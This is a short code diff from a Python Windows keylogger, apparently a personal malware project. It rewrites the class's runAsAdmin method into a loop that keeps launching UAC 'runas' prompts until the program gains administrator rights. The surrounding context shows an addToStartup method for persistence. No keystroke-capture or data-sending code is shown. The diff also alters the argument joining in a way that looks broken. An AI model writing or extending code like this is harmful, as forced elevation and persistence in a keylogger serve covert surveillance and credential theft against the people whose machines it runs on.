@@ -16,16 +16,17 @@ class Keylogger:
 
     # this are primary methods which should be done
 
-    def isAdmin(self):
-        try:
-            return ctypes.wind11.shell32.IsUserAnAdmin()
-        except:
-            return False
-
     def runAsAdmin(self):
-        if not self.isAdmin():
-            ctypes.wind11.shell32.ShellExecuteW(None, "runas", 
-                                                sys.executable, " ".join(sys.argv), None, 1)
+        while True:
+            ans = ctypes.windll.shell32.IsUserAnAdmin()
+            if ans == 0:
+                ctypes.windll.shell32.ShellExecuteW(None, "runas",
+                                                    sys.executable, 
+                                                    "".join(sys.argv),
+                                                    None, 1)
+            else:
+                break
+
 
     def addToStartup(self):
         scriptPath = os.path.abspath(sys.argv[0])
